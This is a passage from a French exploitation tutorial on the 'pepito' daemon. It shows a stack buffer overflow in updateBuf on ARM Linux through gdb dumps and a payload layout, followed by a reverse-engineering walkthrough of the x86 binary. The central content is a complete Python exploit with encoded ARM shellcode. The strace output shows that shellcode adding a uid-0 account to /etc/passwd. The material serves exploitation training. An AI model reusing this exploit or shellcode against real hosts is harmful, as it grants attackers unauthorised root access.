+	"\x09\x5c\x49\xec\x0d\x5c\x83\xee\x19\xf3\x23\xed\x74\x4a\x51\x3c"
+	"\xf3\x2d\xf3\x3d\xf3\x3d\xf3\x3d\x49\x3d\xd0\x2e\xc4\x3e\x09\x2b"
+	"\x0d\xd3\x8c\x4a\x4d\x4a\x04\x10\x75\x4a\x14\x3d\xcc\x4a\x25\x2e"
+	"\x08\x2b\x0d\xd3\x4d\x4a\x04\x10\x0a\x2b\x0d\xd3\x16\x45\x04\x10"
+	"\x0d\x2b\x0d\xd3\x7f\x64\x69\x60\x60\x21\x7f\x78\x63\x7e\x61\x36"
+	"\x4d\x76\x3b\x59\x76\x40\x35\x39\x3b\x5c\x6a\x42\x41\x36\x3c\x36"
+	"\x3c\x36\x36\x23\x36\x23\x6e\x65\x62\x23\x7f\x64\x06\x23\x69\x78"
+	"\x6f\x23\x7c\x6d\x7f\x7f\x7b\x68"
+
+
+
+
+]=-----------------------------------------{ Exploitation Stack Buffer Overflow
+
+
+
+Nous allons exploiter la vulnérabilité qui ce trouve dans la fonction updatebuf.
+Pour l'exploitation nous sommes obligé de placé notre shellcode sur notre stack,
+il n'est pas possible comme sous x86 de le placer dans la section .data dans un
+des tableaux (guestbook, password) car leur valeur dans la memoir contienne des
+null bytes.
+
+
+root@ARM9:~/sploit/pepito# nm ../../pepito/pepito | grep -e password -e guestBook
+000120b4 d guestBook
+000122b4 d password
+
+
+Nous allons palcer notre shellcode sur la satck pour pouvoir avoir un adresse sur
+4 octets (l'ASLR est désactivé).
+
+
+
+On va commencer par connaitre l'adresse de notre stack au moment de l'appel au
+sprintf car dans l'exploitation ce registre va être écrasé.
+
+
+	(gdb) disass updateBuf
+	Dump of assembler code for function updateBuf:
+	0x00008cc8 <updateBuf+0>:	mov	r12, sp
+	0x00008ccc <updateBuf+4>:	push	{r11, r12, lr, pc}
+        [...]
+	0x00008d18 <updateBuf+80>:	ldr	r1, [pc, #80]	; 0x8d70 <updateBuf+168>
+	0x00008d1c <updateBuf+84>:	ldr	r2, [r11, #-16]
+	0x00008d20 <updateBuf+88>:	bl	0x8a1c <sprintf>
+	0x00008d24 <updateBuf+92>:	mov	r3, r0
+	0x00008d28 <updateBuf+96>:	mov	r2, r3
+        [...]s
+	End of assembler dump.
+	(gdb) b *0x00008d20
+	Breakpoint 1 at 0x8d20: file main.c, line 82.s
+	(gdb) set follow-fork-mode child
+	(gdb) r start
+	Starting program: /root/pepito/pepito start
+	Daemon started
+	[Switching to process 1668]
+
+	Breakpoint 1, 0x00008d20 in updateBuf (buf=0xbeffe578 "",
+	    packetPtr=0xbeffea71, packetSize=0) at main.c:82
+	82	    if (sprintf(buf, "touch lastvisit_%s\n", name) >= 512)
+	(gdb) i r
+	r0             0xbeffe578	3204441464
+	r1             0x9a14	39444
+	r2             0x13008	77832
+	r3             0x13008	77832
+	r4             0x9914	39188
+	r5             0x0	0
+	r6             0x8a34	35380
+	r7             0x0	0
+	r8             0x0	0
+	r9             0x0	0
+	r10            0x40025000	1073893376
+	r11            0xbeffe56c	3204441452
+	r12            0x132ac	78508
+	sp             0xbeffe548	0xbeffe548
+	lr             0x91cc	37324
+	pc             0x8d20	0x8d20 <updateBuf+88>
+	fps            0x1001000	16781312
+	cpsr           0x20000010	536870928
+	(gdb) c
+	Continuing.
+	[tcsetpgrp failed in terminal_inferior: No such process]
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x44332210 in ?? ()
+	(gdb)
+
+
+Nous connaisons maintenant l'etat du registre sp au moment de l'appel à sprintf.
+
+	sp = 0xbeffe548
+
+Notre payload va donc avoir une structure comme suit:
+
+	[padding] [sp 0xbeffe548] [pc] [nop] [shellcode]
+
+On relance maintenant daemon pour connaître l'adresse de nos nop sur la stack.
+
+
+	(gdb) x/256x $sp
+	0xbeffe558:	0xbeffe578	0x00013008	0xbeffe784	0xbeffe570
+	0xbeffe568:	0x00008db8	0x00008cd4	0x00000328	0xbeffe7c9
+	0xbeffe578:	0x63756f74	0x616c2068	0x69767473	0x5f746973
+	0xbeffe588:	0x41414120	0x41414141	0x41414141	0x41414141
+	0xbeffe598:	0x41414141	0x41414141	0x41414141	0x41414141
+	0xbeffe5a8:	0x41414141	0x41414141	0x41414141	0x41414141
+	[...]
+	0xbeffe738:	0x41414141	0x41414141	0x41414141	0x41414141
+	0xbeffe748:	0x41414141	0x41414141	0x41414141	0x41414141
+	0xbeffe758:	0x41414141	0x41414141	0x41414141	0x41414141
+	0xbeffe768:	0x41414141	0x41414141	0x41414141	0x41414141
+	0xbeffe778:	0x41414141	0xbeffe558	0x44332211	0x90909090
+	0xbeffe788:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbeffe798:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbeffe7a8:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbeffe7b8:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbeffe7c8:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbeffe7d8:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbeffe7e8:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbeffe7f8:	0x90909090	0x90909090	0x90909090	0xe28f6024
+	0xbeffe808:	0xe12fff16	0xe3a04089	0xe3540c01	0x812fff1e
+	0xbeffe818:	0xe2444089	0xe7de5004	0xe225500c	0xe7ce5004
+	0xbeffe828:	0xe284408a	0xeafffff7	0xebfffff5	0xec495c09
+	0xbeffe838:	0xee835c0d	0xed23f319	0x3c514a74	0x3df32df3
+	0xbeffe848:	0x3df33df3	0x2ed03d49	0x2b093ec4	0x4a8cd30d
+	0xbeffe858:	0x10044a4d	0x3d144a75	0x2e254acc	0xd30d2b08
+	0xbeffe868:	0x10044a4d	0xd30d2b0a	0x10044516	0xd30d2b0d
+	0xbeffe878:	0x6069647f	0x787f2160	0x36617e63	0x593b764d
+	0xbeffe888:	0x39354076	0x426a5c3b	0x363c3641	0x2336363c
+	0xbeffe898:	0x656e2336	0x647f2362	0x78692306	0x6d7c236f
+	0xbeffe8a8:	0x687b7f7f	0x4141000a	0x41414141	0x41414141
+	0xbeffe8b8:	0x41414141	0x41414141	0x41414141	0x41414141
+
+
+
+}=------{ Schéma d'exploitation }
+
+
+                                                 +------------+
+                                                 ^            v
+	+-----------------+---------------+---------------+-----------+-----------+
+	|  Padding x 499  | SP 0xbeffe548 | PC 0xbeffe7a8 | NOP x 128 | SHELLCODE |
+	+-----------------+---------------+---------------+-----------+-----------+
+
+
+
+}=------{ Sploit }
+
+
+	#!/usr/bin/env python
+
+	import socket
+	import os
+	import time
+	import sys
+
+	if len(sys.argv) != 3:
+	   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
+	   sys.exit(1)
+
+	try:
+	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	   connect = s.connect((sys.argv[1], int(sys.argv[2])))
+	except:
+	   print "[-] Error connexion"
+	   sys.exit(1)
+
+	shellcode = "\x24\x60\x8f\xe2\x16\xff\x2f\xe1\x89\x40\xa0\xe3\x01\x0c\x54\xe3" \
+		    "\x1e\xff\x2f\x81\x89\x40\x44\xe2\x04\x50\xde\xe7\x0c\x50\x25\xe2" \
+		    "\x04\x50\xce\xe7\x8a\x40\x84\xe2\xf7\xff\xff\xea\xf5\xff\xff\xeb" \
+		    "\x09\x5c\x49\xec\x0d\x5c\x83\xee\x19\xf3\x23\xed\x74\x4a\x51\x3c" \
+		    "\xf3\x2d\xf3\x3d\xf3\x3d\xf3\x3d\x49\x3d\xd0\x2e\xc4\x3e\x09\x2b" \
+		    "\x0d\xd3\x8c\x4a\x4d\x4a\x04\x10\x75\x4a\x14\x3d\xcc\x4a\x25\x2e" \
+		    "\x08\x2b\x0d\xd3\x4d\x4a\x04\x10\x0a\x2b\x0d\xd3\x16\x45\x04\x10" \
+		    "\x0d\x2b\x0d\xd3\x7f\x64\x69\x60\x60\x21\x7f\x78\x63\x7e\x61\x36" \
+		    "\x4d\x76\x3b\x59\x76\x40\x35\x39\x3b\x5c\x6a\x42\x41\x36\x3c\x36" \
+		    "\x3c\x36\x36\x23\x36\x23\x6e\x65\x62\x23\x7f\x64\x06\x23\x69\x78" \
+		    "\x6f\x23\x7c\x6d\x7f\x7f\x7b\x68"
+
+	buff  = "\x41" * 499
+	buff += "\x58\xe5\xff\xbe"   # sp 0xbeffe548
+	buff += "\xa8\xe7\xff\xbe"   # pc 0xbeffe7a8
+	buff += "\x90" * 128
+	buff += shellcode
+
+	cmdID = "3 "
+	arg3  = " "+buff
+	arg2  = str(len(arg3))
+	payload = cmdID + arg2 + arg3
+
+	print "[+] Send payload..."
+	try:
+	   s.send(payload)
+	   s.close
+	except:
+	   print "[-] Error send payload"
+	   sys.exit(1)
+	print "[+] done!"
+
+
+
+Regardons avec strace comment réagit pepito au lancement de notre exploit.
+
+
+root@ARM9:~/pepito# strace -f ./pepito start
+execve("./pepito", ["./pepito", "start"], [/* 17 vars */]) = 0
+brk(0)                                  = 0x13000
+uname({sys="Linux", node="ARM9", ...})  = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4001d000
+[..]
+rt_sigaction(SIGUSR1, {0x920c, [USR1], SA_RESTART|0x4000000}, {SIG_DFL}, 8) = 0
+clone(Process 1840 attached (waiting for parent)
+Process 1840 resumed (parent 1839 ready)
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x40021628) = 1840
+[pid  1840] setsid()                    = 1840
+[pid  1840] brk(0)                      = 0x13000
+[pid  1840] brk(0x34000)                = 0x34000
+[pid  1840] open("pepito.pid", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+[pid  1840] fstat64(3, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
+[pid  1840] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4001e000
+[pid  1840] write(3, "1840"..., 4)      = 4
+[pid  1840] close(3)                    = 0
+[pid  1840] munmap(0x4001e000, 4096)    = 0
+[pid  1840] write(2, "Daemon started\n"..., 15Daemon started
+) = 15
+[pid  1840] socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+[pid  1840] setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+[pid  1840] bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+[pid  1840] listen(3, 1)                = 0
+[pid  1840] accept(3,  <unfinished ...>
+[pid  1839] exit_group(0)               = ?
+<... accept resumed> {sa_family=AF_INET, sin_port=htons(44751), sin_addr=inet_addr("127.0.0.1")}, [16]) = 4
+##################################################################
+# recv(4, "3 804 AAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4096, 0) = 809 #
+# open("/etc/passwd\n", O_WRONLY|O_CREAT|O_APPEND, 0644) = 5     #
+# write(5, "shell-storm:Az7UzL957PfNM:0:0::/:"..., 41) = 41      #
+# close(5)                                = 0                    #
+# exit(1094795585)                        = ?                    #
+# Process 1840 detached                                          #
+##################################################################
+root@ARM9:~/pepito#
+
+
+
+}=------{ Bilan sur les exploitations ARM }
+
+
+L'exploiation d'une faille applicative de type debordement de tampon sur un
+environement Linux ARM ne change pas pas d'un environement x86. Les seul
+choses qui diffère sont, la création des shellcodes et les adresses des
+section qui sont sur 2 octets.
+
+
+
+
+
+  _______                __  __              _______               __    __            _______
+ |   _   |.-----..-----.|__||  |_ .-----.   |   _   |.---.-..----.|  |_ |__|.-----.   |   _   |
+ |.  1   ||  -__||  _  ||  ||   _||  _  |   |.  1   ||  _  ||   _||   _||  ||  -__|   |___|   |
+ |.  ____||_____||   __||__||____||_____|   |.  ____||___._||__|  |____||__||_____|    _(__   |
+ |:  |           |__|                       |:  |                                     |:  1   |
+ |::.|                                      |::.|                                     |::.. . |
+ `---'                                      `---'                                     `-------'
+
+
+
+
+]=-----------------------------------------------{ Pepito 2011 troisième partie.
+
+
+Dans cette partie, nous allons faire du Reverse Engineering, car c'est bien beau
+d'exploiter une application quand on a les sources, mais la plupart du temps nous
+n'avons pas accès aux sources. C'est pourquoi, dans cette partie, nous allons
+juste utiliser gdb et notre cerveau.
+
+
+]=-------------------------------------------------------------------{ Sommaire.
+
+
+	01 --{ Fonction main
+	02 --{ Fonction updatebuf
+	03 --{ Fonction handlePacket
+	04 --{ Fonction handlerAddToGuestBook
+	05 --{ Fonction handlerChangePassword
+	06 --{ Fonction passwordCheck
+	07 --{ Fonction getStr
+	08 --{ Fonction getPacket
+	09 --{ Fonction acceptClient
+	10 --{ Conclusion
+
+
+]=--------------------------------------------------------------{ Fonction main.
+
+
+	== Comparaisons if (argc < 1) ==================================
+
+	   0x08048e9d <+9>:	cmpl   $0x1,0x8(%ebp)
+	   0x08048ea1 <+13>:	jle    0x8048f1a <main+134>
+
+	================================================================
+
+
+	== if (argc < 1) ===============================================
+
+	   0x08048f1a <+134>:	mov    0xc(%ebp),%eax    <= place argv[0] dans eax
+	   0x08048f1d <+137>:	mov    (%eax),%ecx	 <= place le contenu de argv[0] dans ecx
+	   0x08048f1f <+139>:	mov    $0x8049769,%edx   <= place "usage: %s {start|debug|stop}\n" dans edx
+	   0x08048f24 <+144>:	mov    0x804ae9c,%eax    <= stderr dans %eax
+	   0x08048f29 <+149>:	mov    %ecx,0x8(%esp)    <= push sur la stack pour le printf
+	   0x08048f2d <+153>:	mov    %edx,0x4(%esp)    <= push sur la stack pour le printf
+	   0x08048f31 <+157>:	mov    %eax,(%esp)       <= push sur la stack pour le printf
+	   0x08048f34 <+160>:	call   0x8048a28 <fprintf@plt>
+	   0x08048f39 <+165>:	mov    $0x0,%eax         <= place 0 dans eax pour le return(0)
+	   0x08048f3e <+170>:	leave
+	   0x08048f3f <+171>:	ret
+
+	================================================================
+
+
+	== if (argc > 1) ===============================================
+
+	   0x08048ea3 <+15>:	mov    0xc(%ebp),%eax          <= place argv[0] sur la stack
+	   0x08048ea6 <+18>:	add    $0x4,%eax               <= +4 pour argv[1] (WTF GCC ^^)
+	   0x08048ea9 <+21>:	mov    (%eax),%eax             <= place le contenu de eax dans eax
+	   0x08048eab <+23>:	movl   $0x8049758,0x4(%esp)    <= place "start" sur la stack pour strcmp
+	   0x08048eb3 <+31>:	mov    %eax,(%esp)             <= place argv[1] sur la stack pour strcmp
+	   0x08048eb6 <+34>:	call   0x8048aa8 <strcmp@plt>
+	   0x08048ebb <+39>:	test   %eax,%eax               <= test eax = 0
+	   0x08048ebd <+41>:	jne    0x8048ecd <main+57>     <= si eax != 0 go prochain test
+	   0x08048ebf <+43>:	movl   $0x0,(%esp)             <= sinon place 0 sur la stack pour runDaemon
+	   0x08048ec6 <+50>:	call   0x80491bd <runDaemon>
+	   0x08048ecb <+55>:	jmp    0x8048f3e <main+170>    <= jump sur le return
+	   0x08048ecd <+57>:	mov    0xc(%ebp),%eax	       <= place argv[0] sur la stack
+	   0x08048ed0 <+60>:	add    $0x4,%eax               <= +4 pour argv[1]
+	   0x08048ed3 <+63>:	mov    (%eax),%eax             <= place le contenu de eax dans eax
+	   0x08048ed5 <+65>:	movl   $0x804975e,0x4(%esp)    <= place "debug" sur la stack pour strcmp
+	   0x08048edd <+73>:	mov    %eax,(%esp)             <= place argv[1] sur la stack pour strcmp
+	   0x08048ee0 <+76>:	call   0x8048aa8 <strcmp@plt>
+	   0x08048ee5 <+81>:	test   %eax,%eax               <= test eax = 0
+	   0x08048ee7 <+83>:	jne    0x8048ef7 <main+99>     <= si eax != 0 go prochain test
+	   0x08048ee9 <+85>:	movl   $0x1,(%esp)             <= sinon place 1 sur la stack pour runDaemon
+	   0x08048ef0 <+92>:	call   0x80491bd <runDaemon>
+	   0x08048ef5 <+97>:	jmp    0x8048f3e <main+170>    <= jump sur le return
+	   0x08048ef7 <+99>:	mov    0xc(%ebp),%eax          <= place argv[0] sur la stack
+	   0x08048efa <+102>:	add    $0x4,%eax               <= +4 pour argv[1]
+	   0x08048efd <+105>:	mov    (%eax),%eax             <= place le contenu de eax dans eax
+	   0x08048eff <+107>:	movl   $0x8049764,0x4(%esp)    <= place "stop" sur la stack pour strcmp
+	   0x08048f07 <+115>:	mov    %eax,(%esp)             <= place argv[1] sur la stack pour strcmp
+	   0x08048f0a <+118>:	call   0x8048aa8 <strcmp@plt>
+	   0x08048f0f <+123>:	test   %eax,%eax               <= test eax = 0
+	   0x08048f11 <+125>:	jne    0x8048f1a <main+134>    <= si eax != 0 go prochain afficher la syntax
+	   0x08048f13 <+127>:	call   0x80492e4 <stopDaemon>  <= sinon on stop le daemon
+	   0x08048f18 <+132>:	jmp    0x8048f3e <main+170>    <= et on saute sur return
+
+	================================================================
+
+
+
+]=---------------------------------------------------------{ Fonction updatebuf.
+
+
+	== Declaration variable ========================================
+
+	   0x08048ccf <+6>:	movl   $0x0,-0xc(%ebp)  <= déclare une variable et la set à 0 (on nomme v1)
+
+	================================================================
+
+
+	== getStr() ====================================================
+
+	   0x08048cd6 <+13>:	lea    0x10(%ebp),%eax       <= place le deuxième argument (packetSize) dans %eax
+	   0x08048cd9 <+16>:	mov    %eax,0x4(%esp)        <= place eax sur la stack
+	   0x08048cdd <+20>:	lea    0xc(%ebp),%eax        <= place le premier argument (packetPtr) dans %eax
+	   0x08048ce0 <+23>:	mov    %eax,(%esp)           <= place eax sur la stack
+	   0x08048ce3 <+26>:	call   0x8048fde <getStr>
+	   0x08048ce8 <+31>:	mov    %eax,-0xc(%ebp)       <= place le résultat de getStr dans v1
+
+	================================================================
+
+	== check getStr() ==============================================
+
+	   0x08048ceb <+34>:	cmpl   $0x0,-0xc(%ebp)       <= compare v1 à 0
+
+	================================================================
+
+	== if getStr() != 0 ============================================
+
+	   0x08048cef <+38>:	je     0x8048d2c <updateBuf+99>  <= si = 0 go en +99
+	   0x08048cf1 <+40>:	mov    $0x8049718,%eax           <= sinon place "touch lastvisit_%s\n" dans %eax
+	   0x08048cf6 <+45>:	mov    -0xc(%ebp),%edx           <= place v1 dans %edx
+	   0x08048cf9 <+48>:	mov    %edx,0x8(%esp)            <= place edx sur la stack pour sprintf
+	   0x08048cfd <+52>:	mov    %eax,0x4(%esp)            <= place eax sur la stack pour sprintf
+	   0x08048d01 <+56>:	mov    0x8(%ebp),%eax            <= place argument 1 (buf) dans %eax
+	   0x08048d04 <+59>:	mov    %eax,(%esp)               <= place %eax sur la stack
+	   0x08048d07 <+62>:	call   0x8048878 <sprintf@plt>
+
+	   0x08048d0c <+67>:	cmp    $0x1ff,%eax               <= compare ce que renvoie eax = 512
+	   0x08048d11 <+72>:	jle    0x8048d1a <updateBuf+81>  <= si < go +81
+	   0x08048d13 <+74>:	mov    $0x1,%eax                 <= sinon place 1 pour return 1
+	   0x08048d18 <+79>:	jmp    0x8048d31 <updateBuf+104> <= jump return
+	   0x08048d1a <+81>:	mov    -0xc(%ebp),%eax           <= sinon place v1 dans %eax
+	   0x08048d1d <+84>:	mov    %eax,(%esp)               <= eax sur esp pour free
+	   0x08048d20 <+87>:	call   0x8048978 <free@plt>
+	   0x08048d25 <+92>:	mov    $0x0,%eax                 <= place 0 dans %eax pour le return
+	   0x08048d2a <+97>:	jmp    0x8048d31 <updateBuf+104> <= go return
+
+	================================================================
+
+	== if getStr() == 0 ============================================
+
+	   0x08048d2c <+99>:	mov    $0x1,%eax                 <= place 1 dans %eax pour return (1)
+	   0x08048d31 <+104>:	leave
+	   0x08048d32 <+105>:	ret
+
+	================================================================
+
+
+]=---------------------------------------------------------------{ handlePacket.
+
+
+	== getNumber() =================================================
+
+	   0x08048e3a <+6>:	lea    0xc(%ebp),%eax        <= place le 2eme argument (packetSize) dans %eax
+	   0x08048e3d <+9>:	mov    %eax,0x4(%esp)        <= place %eax sur la stack pour getNumber
+	   0x08048e41 <+13>:	lea    0x8(%ebp),%eax        <= place le 1er argument (packetPtr) dans %eax
+	   0x08048e44 <+16>:	mov    %eax,(%esp)           <= place %eax sur la stack
+	   0x08048e47 <+19>:	call   0x8048f8d <getNumber>
+	   0x08048e4c <+24>:	mov    %eax,-0xc(%ebp)       <= place le résultat de getNumber dans une variable
+								qu'on va appeler v1
+
+	== check getNumber() ===========================================
+
+	   0x08048e4f <+27>:	cmpl   $0x5,-0xc(%ebp)       <= compare v1 à 5
+
+	================================================================
+
+
+	== if (v1 < 5) go +64 ==========================================
+
+	   0x08048e53 <+31>:	jle    0x8048e74 <handlePacket+64>
+
+	================================================================
+
+	== if (v1 > 5) =================================================
+
+	   0x08048e55 <+33>:	mov    $0x8049741,%edx		<= place "ID (%i) out of range.\n" dans %edx
+	   0x08048e5a <+38>:	mov    0x804ae9c,%eax		<= place @<stderr@@GLIBC_2.0> dans %eax
+	   0x08048e5f <+43>:	mov    -0xc(%ebp),%ecx          <= place v1 dans %ecx
+	   0x08048e62 <+46>:	mov    %ecx,0x8(%esp)		<= place ecx sur la stack pour printf
+	   0x08048e66 <+50>:	mov    %edx,0x4(%esp)		<= place edx sur la stack pour printf
+	   0x08048e6a <+54>:	mov    %eax,(%esp)              <= place %eax sur la stack pour printf
+	   0x08048e6d <+57>:	call   0x8048a28 <fprintf@plt>
+	   0x08048e72 <+62>:	jmp    0x8048e8d <handlePacket+89> <= go au return
+
+	================================================================
+
+	== if (v1 < 5) =================================================
+
+	   0x08048e74 <+64>:	mov    -0xc(%ebp),%eax		<= place v1 dans %eax
+
+
+		   == Pointeur sur fonction ==========================
+
+		   0x08048e77 <+67>:	mov    0x804ae80(,%eax,4),%ecx	<= En intel (mov ecx,[0804ae80h+eax*4])
+									   Putin sur cette ligne ça va troller !
+									   on place l'adresse de notre fonction
+									   à appeler en fonction de v1
+
+		   0x08048e7e <+74>:	mov    0xc(%ebp),%edx		<= place packetSize dans %edx
+		   0x08048e81 <+77>:	mov    0x8(%ebp),%eax		<= place packetPtr dans %eax
+		   0x08048e84 <+80>:	mov    %edx,0x4(%esp)		<= place edx sur la stack
+		   0x08048e88 <+84>:	mov    %eax,(%esp)              <= place %eax sur la stack
+		   0x08048e8b <+87>:	call   *%ecx                    <= appelle le %ecx
+
+		  ====================================================
+
+	   0x08048e8d <+89>:	mov    $0x0,%eax                <= place 0 dans %eax pour le return
+	   0x08048e92 <+94>:	leave
+	   0x08048e93 <+95>:	ret
+
+	================================================================
+
+
+]=------------------------------------------------------{ handlerAddToGuestBook.
+
+
+	== getStr() ====================================================
+
+	   0x08048c7d <+6>:	lea    0xc(%ebp),%eax      <= place le 2eme (PacketSize) argument dans %eax
+	   0x08048c80 <+9>:	mov    %eax,0x4(%esp)      <= on place %eax sur la stack pour getStr
+	   0x08048c84 <+13>:	lea    0x8(%ebp),%eax      <= place le 1er (packetPtr) argument dans %eax
+	   0x08048c87 <+16>:	mov    %eax,(%esp)         <= puis %eax sur la stack pour getStr
+	   0x08048c8a <+19>:	call   0x8048fde <getStr>
+	   0x08048c8f <+24>:	mov    %eax,-0xc(%ebp)     <= on récupère le retour de getstr qu'on place dans
+							      une variable qu'on nomme v1
+
+	== check getStr() ==============================================
+
+	   0x08048c92 <+27>:	cmpl   $0x0,-0xc(%ebp)     <= compare v1 à 0
+
+	================================================================
+
+	   0x08048c96 <+31>:	je     0x8048cc2 <handlerAddToGuestBook+75> <= si v1 == 0 go return
+
+	== (if v1 != 0) ================================================
+
+	   0x08048c98 <+33>:	mov    -0xc(%ebp),%eax		<= place v1 dans %eax
+	   0x08048c9b <+36>:	mov    %eax,0x4(%esp)		<= place eax sur la stack pour strcpy
+	   0x08048c9f <+40>:	movl   $0x804aa80,(%esp)	<= place l'@ de guestBook sur la stack
+								0x804aa80 <guestBook>: '#' <repeats 34 times>
+
+	   0x08048ca6 <+47>:	call   0x80489d8 <strcpy@plt>	<= appelle strcpy
+	   0x08048cab <+52>:	movl   $0x80496f4,(%esp)	<= place "Advertisement successfully changed\n"
+								   sur la stack pour sendLogMessage
+	   0x08048cb2 <+59>:	call   0x8049521 <sendLogMessage>
+	   0x08048cb7 <+64>:	mov    -0xc(%ebp),%eax		<= place v1 dans %eax
+	   0x08048cba <+67>:	mov    %eax,(%esp)		<= place eax sur la stack
+	   0x08048cbd <+70>:	call   0x8048978 <free@plt>	<= free v1
+
+
+	   0x08048cc2 <+75>:	mov    $0x0,%eax		<= place 0 pour return 0
+	   0x08048cc7 <+80>:	leave
+	   0x08048cc8 <+81>:	ret
+
+	================================================================
+
+
+]=------------------------------------------------------{ handlerChangePassword.
+
+
+	== getStr() 1 ==================================================
+
+	   0x08048bd0 <+6>:	lea    0xc(%ebp),%eax		<= place le 2eme (PacketSize) argument dans %eax
+	   0x08048bd3 <+9>:	mov    %eax,0x4(%esp)		<= on place %eax sur la stack pour getStr
+	   0x08048bd7 <+13>:	lea    0x8(%ebp),%eax		<= place le 1er (packetPtr) argument dans %eax
+	   0x08048bda <+16>:	mov    %eax,(%esp)		<= puis %eax sur la stack pour getStr
+	   0x08048bdd <+19>:	call   0x8048fde <getStr>
+	   0x08048be2 <+24>:	mov    %eax,-0xc(%ebp)		<= on récupère le retour de getstr qu'on place dans
+							      	   une variable qu'on nomme v1
+
+	================================================================
+
+	== getStr() 2 ==================================================
+
+	   0x08048be5 <+27>:	lea    0xc(%ebp),%eax		<= place le 2eme (PacketSize) argument dans %eax
+	   0x08048be8 <+30>:	mov    %eax,0x4(%esp)		<= on place %eax sur la stack pour getStr
+	   0x08048bec <+34>:	lea    0x8(%ebp),%eax		<= place le 1er (packetPtr) argument dans %eax
+	   0x08048bef <+37>:	mov    %eax,(%esp)		<= puis %eax sur la stack pour getStr
+	   0x08048bf2 <+40>:	call   0x8048fde <getStr>
+	   0x08048bf7 <+45>:	mov    %eax,-0x10(%ebp)		<= on récupère le retour de getstr qu'on place dans
+								   une variable qu'on nomme v2
+
+	================================================================
+
+
+	== checkpassword() =============================================
+
+	   0x08048bfa <+48>:	mov    -0x10(%ebp),%eax			<= place v2 dans %eax
+	   0x08048bfd <+51>:	mov    %eax,(%esp)			<= place %eax sur la stack
+	   0x08048c00 <+54>:	call   0x8048b84 <passwordCheck>	<= checkpassword v2
+	   0x08048c05 <+59>:	test   %eax,%eax			<= test le retour de checkpassword
+
+	================================================================
+
+	   0x08048c07 <+61>:	je     0x8048c10 <handlerChangePassword+70>
+
+	== if (checkpassword() == 0) ===================================
+
+	   0x08048c09 <+63>:	mov    $0x1,%eax				<= place 1 pour le return
+	   0x08048c0e <+68>:	jmp    0x8048c75 <handlerChangePassword+171>    <= jmp return
+
+	================================================================
+
+	== if (checkpassword() != 0) ===================================
+
+
+		== if (v1 == 0) ========================================
+
+			   0x08048c10 <+70>:	cmpl   $0x0,-0xc(%ebp)                        <= compare v1 a 0
+			   0x08048c14 <+74>:	je     0x8048c65 <handlerChangePassword+155>  <= si = 0 go en +155
+
+			   0x08048c16 <+76>:	mov    -0xc(%ebp),%eax			      <= sinon on place v1 dans %eax
+			   0x08048c19 <+79>:	mov    %eax,(%esp)			      <= puis %eax sur la stack pour strlen
+			   0x08048c1c <+82>:	call   0x80489b8 <strlen@plt>
+
+			== if (strlen(v1) >= 512) ======================
+
+			   0x08048c21 <+87>:	cmp    $0x1ff,%eax                            <= compare le résultat de strlen avec 512
+			   0x08048c26 <+92>:	jbe    0x8048c3b <handlerChangePassword+113>  <= si inférieur go +113
+			   0x08048c28 <+94>:	movl   $0x80496c0,(%esp)		      <= sinon place "Password too long\n" sur la stack
+			   0x08048c2f <+101>:	call   0x8049521 <sendLogMessage>
+			   0x08048c34 <+106>:	mov    $0x1,%eax                              <= place 1 pour le return
+			   0x08048c39 <+111>:	jmp    0x8048c75 <handlerChangePassword+171>  <= jump return
+
+			================================================
+
+			== if (strlen(v1) <= 512) ======================
+
+			   0x08048c3b <+113>:	mov    -0xc(%ebp),%eax			<= place v1 dans %eax
+			   0x08048c3e <+116>:	mov    %eax,0x4(%esp)			<= place eax sur la stack
+			   0x08048c42 <+120>:	movl   $0x804ac80,(%esp)		<= place l@ de passwd sur la stack
+											   0x804ac80 <password>: 0x00000000
+			   0x08048c49 <+127>:	call   0x80489d8 <strcpy@plt>           <= copie v1 dans password
+			   0x08048c4e <+132>:	movl   $0x80496d4,(%esp)                <= place "Password successfully changed\n" sur la stack
+			   0x08048c55 <+139>:	call   0x8049521 <sendLogMessage>
+			   0x08048c5a <+144>:	mov    -0xc(%ebp),%eax                  <= place v1 dans %eax
+			   0x08048c5d <+147>:	mov    %eax,(%esp)                      <= place %eax sur la stack
+			   0x08048c60 <+150>:	call   0x8048978 <free@plt>             <= free v1
+			   0x08048c65 <+155>:	mov    -0x10(%ebp),%eax                 <= place v2 dans %eax
+
+			================================================
+
+		========================================================
+
+	   0x08048c68 <+158>:	mov    %eax,(%esp)            <= place %eax sur la stack
+	   0x08048c6b <+161>:	call   0x8048978 <free@plt>   <= free v2
+	   0x08048c70 <+166>:	mov    $0x0,%eax              <= place 0 pour le return
+
+	================================================================
+
+	   0x08048c75 <+171>:	leave
+	   0x08048c76 <+172>:	ret
+
+
+
+]=--------------------------------------------------------------{ passwordCheck.
+
+
+
+	   0x08048b8a <+6>:	mov    $0x804ac80,%eax		<= place l'@ de password dans %eax
+								   0x804ac80 <password>: 0x00000000
+	   0x08048b8f <+11>:	movzbl (%eax),%eax		<= place le contenu de %eax dans %eax
+	   0x08048b92 <+14>:	test   %al,%al			<= test si %eax = 0
+
+
+	== if (password != 0) ==========================================
+
+	   0x08048b94 <+16>:	je     0x8048bc3 <passwordCheck+63>   <= si password == 0 jump +63
